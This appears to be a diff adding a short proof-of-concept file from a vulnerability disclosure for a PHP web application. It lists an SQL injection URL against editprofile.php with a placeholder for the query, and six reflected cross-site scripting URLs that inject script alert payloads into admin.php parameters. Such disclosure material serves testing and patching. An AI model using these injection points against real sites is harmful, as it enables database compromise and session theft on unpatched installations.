@@ -1,0 +1,13 @@
+SQL injection:
+
+http://www.example.com/editprofile.php?action=abos2&amp;digest[1&#039;SQL_CODE_HERE]=1
+
+Cross-site scripting:
+
+http://www.example.com/admin.php?action=designs&amp;job=templates_file_history&amp;file=&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+http://www.example.com/admin.php?action=designs&amp;job=templates_file_revert&amp;dir=&quot;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+http://www.example.com/admin.php?action=designs&amp;job=templates_file_edit2&amp;dir=&quot;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+http://www.example.com/admin.php?action=designs&amp;job=templates_file_delete&amp;dir=&quot;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+http://www.example.com/admin.php?action=explorer&amp;job=newdir&amp;path=&quot;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+http://www.example.com//admin.php?action=explorer&amp;job=chmod&amp;path=&quot;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+
